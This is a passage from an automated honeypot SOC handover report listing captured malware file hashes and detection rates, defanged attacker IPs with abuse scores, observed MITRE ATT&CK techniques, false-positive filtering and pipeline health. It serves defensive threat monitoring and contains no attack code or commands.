| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `206.190.192[.]136` | US | United Electric Cooperative | **100** ⚠️ | 5 |
| `196.199.40[.]4` | GB | SA | **100** ⚠️ | 12 |
| `43.153.12[.]68` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 16 |
| `101.126.54[.]36` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `80.82.70[.]133` | NL | FiberXpress BV | **100** ⚠️ | 50 |
| `14.103.114[.]205` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.184.82[.]249` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `94.23.30[.]215` | FR | OVH SAS | **100** ⚠️ | 0 |
| `179.124.29[.]29` | BR | ZUM TELECOM LTDA- ME | **100** ⚠️ | 20 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 283 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 113 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 88 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 48 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 47 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 295 cases |
| Tool 34  | Credential Extractor        | ✅ 201 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (1.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 88 priority case(s) shown individually · 27 recon entry/entries in table (13 group(s) consolidating 188 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-15T06:03:30Z_
